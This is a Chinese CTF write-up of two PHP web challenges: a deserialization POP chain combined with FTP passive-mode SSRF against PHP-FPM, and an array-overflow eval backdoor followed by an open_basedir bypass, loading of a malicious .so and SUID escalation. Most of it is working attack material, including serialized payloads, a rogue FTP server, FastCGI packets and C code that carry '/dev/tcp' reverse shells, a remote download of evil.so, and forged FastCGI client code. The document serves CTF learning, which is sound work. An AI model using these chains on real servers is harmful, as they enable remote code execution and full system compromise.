##  [陇原战疫2021网络安全大赛]eaaasyphp

### 考点

1. 反序列化--pop链的构成

2. FTP的被动模式打FPM

###  思路总结

>先看到pop链找信息，利用phpinfo，发现了fastcgi，然后利用FTP的被动模式打fpm
>
>通过pop链向服务器写入文件，文件名为FTP服务器位置，而FTP服务器会将文件内容传到一个指定的IP地址，这个ip地址就是fastcgi的位置，加上文件内容的代码执行，从而实现了一个SSRF,反射shell。

###  解题

直接先看首页代码

```php
<?php

class Check {
    public static $str1 = false;
    public static $str2 = false;
}


class Esle {
    public function __wakeup()
    {
        Check::$str1 = true;
    }
}


class Hint {

    public function __wakeup(){
        $this->hint = "no hint";
    }

    public function __destruct(){
        if(!$this->hint){
            $this->hint = "phpinfo";
            ($this->hint)();
        }  
    }
}


class Bunny {

    public function __toString()
    {
        if (Check::$str2) {
            if(!$this->data){
                $this->data = $_REQUEST['data'];
            }
            file_put_contents($this->filename, $this->data);
        } else {
            throw new Error("Error");
        }
    }
}

class Welcome {
    public function __invoke()
    {
        Check::$str2 = true;
        return "Welcome" . $this->username;
    }
}

class Bypass {

    public function __destruct()
    {
        if (Check::$str1) {
            ($this->str4)();
        } else {
            throw new Error("Error");
        }
    }
}

if (isset($_GET['code'])) {
    unserialize($_GET['code']);
} else {
    highlight_file(__FILE__);
}

```

这就是个常规的`pop`链的构成。

几个魔法函数：

```
__wakeup():当调用unserialize时触发
__toString():当类被当作字符串时调用
__invoke():当把类当作函数处理时调用
```

#### 先看phpinfo():

**方法1：**

```php
<?php
class Hint {

    public function __wakeup(){
        $this->hint = "no hint";
    }

    public function __destruct(){
        if(!$this->hint){
            $this->hint = "phpinfo";
            ($this->hint)();
        }
    }
}
$a=new Hint();
echo serialize($a);
```

但是需要绕过`__wakeup`

PHP7 < 7.0.10：反序列化时变量个数大于实际是会绕过

这种不行，但是我们可以**利用负数就可以绕过**

```
?code=O:4:"Hint":-1:{}
```

**方法2**

```php
$a=new Bypass();
$a->aaa=new Esle();
$a->str4='phpinfo';
echo serialize($a);
```

得到：

```
?code=O:6:"Bypass":2:{s:3:"aaa";O:4:"Esle":0:{}s:4:"str4";s:7:"phpinfo";}
```

看到phpinfo有`FastCGI`和这儿

```
file_put_contents($this->filename, $this->data);//代表着上传文件
```

想到了利用FTP(文件传输协议)的被动模式打FastCGI。

#### 我们先尝试写入shell

```php
$check = new Check();
$esle = new Esle();

$a = new Bypass();
$b = new Welcome();
$c = new Bunny();

$c->filename = "shell.txt";
$c->data = "123456";

$b->username = $c;
$b->bbb = $check;
$a->aaa = $esle;
$a->str4 = $b;

echo serialize($a);
```

但是无回显，不行。

####  FTP的被动模式打FastCGI

 FTP 协议的被动模式：客户端试图从FTP服务器上读取/写入一个文件，服务器会通知客户端将文件的内容读取到一个指定的IP和端口上，我们可以指定到127.0.0.1:9000，这样就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF



**搭建恶意ftp服务器**

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0',123)) #端口可改
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

然后通过`Nxshell`在服务器上启动`python3 ftp.py`

(切记需要先cd到当前目录)



**利用gopherus生成发向FPM的数据包**

```
python gopherus.py --exploit fastcgi
/var/www/html/index.php
bash -c "bash -i >& /dev/tcp/ip/39543 0>&1"
```

只要 _ 后面的内容

```
%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%06%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%18SCRIPT_FILENAME%20/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27%20bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/10000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

写pop链

```php

<?php
class Check {
public static $str1 = false;
public static $str2 = false;
}

class Esle {
public function __wakeup()
{
Check::$str1 = true;
}
}



class Bunny {

public function __toString()
{
if (Check::$str2) {
//echo "tostring";
if(!$this->data){
$this->data = $_REQUEST['data'];
}
//file_put_contents($this->filename, $this->data);
} else {
throw new Error("Error");
}
}
}

class Welcome {
public function __invoke()
{
Check::$str2 = true;
return "Welcome" . $this->username;
}
}

class Bypass {

public function __destruct()
{
if (Check::$str1) {
($this->str4)();
} else {
throw new Error("Error");
}
}
}

$a = new Esle(); //str1 = true
$a->tmp = new Bypass();
$a->tmp->str4 = new Welcome(); //str2 = true;
$a->tmp->str4->username = new Bunny();
$a->tmp->str4->username->filename = 'ftp://aaa@VPN:123/123';
$a->tmp->str4->username->data = urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%06%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%18SCRIPT_FILENAME%20/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27%20bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/i/10000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00");
echo urlencode(serialize($a));
```

最后就是监听端口然后传入值，直接反弹shell。

##  蓝帽杯2021 One Pointer PHP

###  考点

1. php数组溢出
2. 写入文件，获取webshell
3. 绕过open_basedir
4. 利用FTP的被动模式攻击php-fpm，绕过disabled_functions
5. Suid提权

打开题目，给出了两个文件

user.php

```php
<?php
class User{
	public $count;
}
?>
```

add_api.php:

```php
<?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){//将cookie中的data值反序列化给$user
	$count[++$user->count]=1;//在count数组添加一个单元，并赋值为1
	if($count[]=1){//判断数组最后序号的值是否为1.
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

###  php数组溢出

我们的目的是利用`backdoor`来执行命令,所以需要绕过判断语句。

我们利用php的数组溢出，在不同的操作系统PHP最大值是不一样的，32位上为`2147483647`，64位上为`9223372036854775807`，所以这里我们应该设置count为`9223372036854775806`

做个小实验：

```
<?php
class User{
    public $count;
}

$a = new User();
$a->count = 9223372036854775806;

$user=unserialize(serialize($a));
$count[++$user->count]=1;
var_dump($count);

if($count[]=1){
    echo "die";
}else{
    echo "success";
}
?>
```

输出:

```php
array(1) {
  [9223372036854775807] =>
  int(1)
}
success
```

发现可以绕过，所以构造反序列化值

```php
<?php
class User{
    public $count;
}

$a = new User();
$a->count = 9223372036854775806;
echo urlencode(serialize($a));

```

输出，一定要使用`urlencode`

```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
```

###  命令执行

所以我们先利用phpinfo验证下是否绕过。

![image-20220224231811173](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242318363.png)



利用成功，找可以利用的信息

disabled_functions

![image-20220224232055268](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242320367.png)



**open_basedir:/var/www/html**

**php-fpm:active**

###  拿webshell

发现没有禁用`file_put_contents`,我们利用这来传入木马。

![image-20220224232546546](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242325655.png)

![image-20220224232605711](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242326834.png)

蚁剑连接成功，访问根目录，发现没有权限，因为`open_basedir`

###  方法1：

####  绕过open_basedir

参考：https://blog.csdn.net/unexpectedthing/article/details/121916703

利用`ini.set()和chdir`

读取文件

```
backdoor=mkdir('flag');chdir('flag');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));
```

![image-20220224233329912](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242333004.png)

flag在根目录，打开文件,没有权限读取文件内容，可能需要提权。

```
backdoor=mkdir('flag');chdir('flag');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents("/flag"));
```

![image-20220224233544582](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242335691.png)





那先读取其他内容

读取`/usr/local/etc/php/php.ini`,看php.ini中的东西

在输出中我们可以看到`extension=easy_bypass.so`，这是加载了异常so文件，**这儿可以利用pwn的**（不太会）

![image-20220224234018259](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242340347.png)

读取下`/etc/nginx/nginx.conf`的配置文件

![image-20220224234236019](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242342115.png)

看到`/etc/nginx/sites-enabled/*`，直接读取nginx的默认配置

![image-20220224234356568](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202242343658.png)

知道了`fastcgi`的端口，并且fpm是active的

####  利用未授权打FPM RCE

##### 加载恶意so文件

写so扩展

```php
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");
}
```

编译（linux）上

```
gcc evil.c -fPIC -shared -o evil.so
```

将编译好的so文件上传到/tmp目录上，实现加载so文件

```
add_api.php?backdoor=mkdir('flag');chdir('flag
');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');copy("http://xx.xx.xx.xx/evil.so","/tmp/evil.so");
```

#####  开启FTP服务器

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 123))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

上传到自己的VPN上，并打开ftp。

#####  上传文件处理

再写一个接收文件的file.php文件，这个文件用于接收恶意的fastcgi请求文件并写回主机

```php
<?php
    $file = $_GET['file'] ?? '/tmp/file';
    $data = $_GET['data'] ?? ':)';
    echo($file."</br>".$data."</br>");
    var_dump(file_put_contents($file, $data));
?>

```



##### 伪造恶意FastCGI请求

网上亘古不变的伪造请求的代码，修改几个配置、路径就好

```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        echo('?file=ftp://ip:9999/&data='.urlencode($request));
//        fwrite($this->_sock, $request);
//        do {
//            $resp = $this->readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp && $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        }
    }
}
?>
<?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) {
//    die("Check your input\n");
//}
//if (!isset($_REQUEST['filepath'])) {
//    $filepath = __FILE__;
//}else{
//    $filepath = $_REQUEST['filepath'];
//}

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php payload -- Doesnt do anything
$php_value = "unserialize_callback_func = system\nextension_dir = /tmp\nextension = evil.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "; // extension_dir即为.so文件所在目录
$params = array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD'    => 'POST',
    'SCRIPT_FILENAME'   => $filepath,
    'SCRIPT_NAME'       => $req,
    'QUERY_STRING'      => 'command=whoami',
    'REQUEST_URI'       => $uri,
    'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
    'PHP_VALUE'         => $php_value,
    'SERVER_SOFTWARE'   => 'ctfking/Tajang',
    'REMOTE_ADDR'       => '127.0.0.1',
    'REMOTE_PORT'       => '9001', // 找准服务端口
    'SERVER_ADDR'       => '127.0.0.1',
    'SERVER_PORT'       => '80',
    'SERVER_NAME'       => 'localhost',
    'SERVER_PROTOCOL'   => 'HTTP/1.1',
    'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>

```

payload

```
?file=ftp://ip:9999/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3D%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+evil.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0ESERVER_SOFTWAREctfking%2FTajang%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

此时ftp建立连接后，会通过被动模式将payload重定向到目标主机本地9001端口的php-fpm上，并成功反弹shell

注意：ftp协议端口之后要加`/`

![image-20211115105719786](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202250013689.png)

#####  流程

先上传so文件=>再上传file.php=>开启ftp服务=>监听端口=>传入payload

##### SUID提权

反弹shell后，查看flag无权限

使用suid提权，查找有权限的命令

```
find / -perm -u=s -type f 2>/dev/null
```

发现php就有suid，php -a进入交互模式，绕过open_basedir并getflag

```
mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');

```

![image-20211115111601887](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202250015864.png)

#####  总结

利用file.php,将伪造的FastCGI请求（文件内容）上传到ftp服务端口，ftp服务器会将文件内容指定到，`9001`端口的fpm，然后恶意fastcgi请求到了fpm后，加载并调用evil.so文件，实现命令执行，反弹shell。

###  方法2：

这个方法没复现成功。

利用用pfsockopen这个函数起socket链接发送原始TCP数据直接打通

disable_function 中ban了fsockopen函数，但我们用的蚁剑bypass FMP实际上就有用到这个函数，所以不能直接使用绕过。但题目没有禁用pfsockopen，而且题目的FastCGI服务开在9001端口，需要在蚁剑的文件中进行手动修改。

将下列文件中的fsockopen替换成pfsockopen

```
\antData\plugins\as_bypass_php_disable_functions-master\payload.js
\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js
```

还需要`antSword-master\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js`中添加一个`127.0.0.1:9001`选项

![image-20220225162512005](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202251625307.png)

#### 步骤：

传入木马，连接蚁剑



启动插件，模式选择fastcgi，地址选127.0.0.1：9001

![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202251628620.png)

蚁剑生成了一个`.antproxy.php`

然后再次创建一个新的副本，连接到.antproxy.php

![image-20220225163032142](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202251630325.png)

直接打开副本就可以得到flag了。（我复现了很多遍，没成功，但是.antproxy.php生成成功了）

#### 原理：

`bypass_php_disable_functions`的fpm插件会上传.so文件，然后开启一个新的不使用php.ini的php进程并加载恶意so文件，来达到绕过`disable_functions`的操作。而`.antproxy.php`这个php的作用是把流量转发到新开启的php进程。我们创建新的副本用来接收流量，从而可以得到目录。因为php本身suid有root权限，因此不用提权即可直接读取flag



